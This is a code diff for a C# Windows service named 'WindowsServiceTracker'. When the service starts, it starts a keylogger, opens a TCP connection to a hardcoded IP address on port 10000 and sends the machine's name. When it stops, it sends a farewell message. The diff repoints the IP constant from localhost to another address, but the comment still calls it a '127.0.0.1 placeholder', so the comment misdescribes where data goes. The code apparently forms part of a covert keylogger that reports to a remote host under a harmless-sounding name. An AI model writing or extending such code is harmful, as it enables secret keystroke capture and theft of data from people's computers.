@@ -22,7 +22,7 @@ namespace WindowsServiceTracker
     {
         //Constants
         //127.0.0.1 = 0x0100007F because of network byte order
-        private const long IP_ADDRESS = 0x0100007F; //127.0.0.1 as placeholder
+        private const long IP_ADDRESS = 0x2E3811AC; //127.0.0.1 as placeholder
         private const int PORT = 10000;
         private const string errorLogName = "TrackerErrorLog";
         private const string errorLogMachine = "TrackerComputer";
@@ -53,38 +53,55 @@ namespace WindowsServiceTracker
 
             //Keep the service running for 15 seconds
             Thread.Sleep(15000);
-            keylog.Start();
+            Keylogger.Start();
 
             //Write to the Windows Event Logs, shows up under Windows Logs --> Application
             EventLog.WriteEntry(errorLogSource, "Test event", EventLogEntryType.Information);
 
             //Some test tcp connection stuff
-            try
-            {
-                tcp = new TcpClient();
-                tcp.Connect(IPPort);
-            }
-            finally
-            {
-                //Another write to the Windows Event Logs, shows up in the same place as before but as type "Error" instead of type "Information"
-                string error = "Service failed to connect to IP address " + IP_ADDRESS + " on port " + PORT;
-                EventLog.WriteEntry(errorLogSource, error, EventLogEntryType.Error);
-            }
+            Connect();
             
-            sendStringMsg(Environment.MachineName);
+            SendStringMsg(Environment.MachineName);
 
         }
 
         protected override void OnStop()
         {
-            keylog.Stop();
-            sendStringMsg("Bye!");
+            Keylogger.Stop();
+            SendStringMsg("Bye!");
 
-            tcp.Close();
-            tcpStream.Close();
+            Disconect();
         }
 
-        private Boolean sendStringMsg(String stringMsg)
+        private bool Connect()
+        {
+            try
+            {
+                tcp = new TcpClient();
+                tcp.Connect(IPPort);
+                return true;
+            }
+            catch (Exception)
+            {
+                //Another write to the Windows Event Logs, shows up in the same place as before but as type "Error" instead of type "Information"
+                string error = "Service failed to connect to IP address " + IP_ADDRESS + " on port " + PORT;
+                EventLog.WriteEntry(errorLogSource, error, EventLogEntryType.Error);
+            }
+            return false;
+        }
+
+        private bool Disconect()
+        {
+            try
+            {
+                tcpStream.Close();
+            }
+            catch(NullReferenceException)
+            { }
+            return true;
+        }
+
+        private Boolean SendStringMsg(String stringMsg)
         {
             if (tcp != null && (tcpStream == null || !tcpStream.CanWrite))
             {
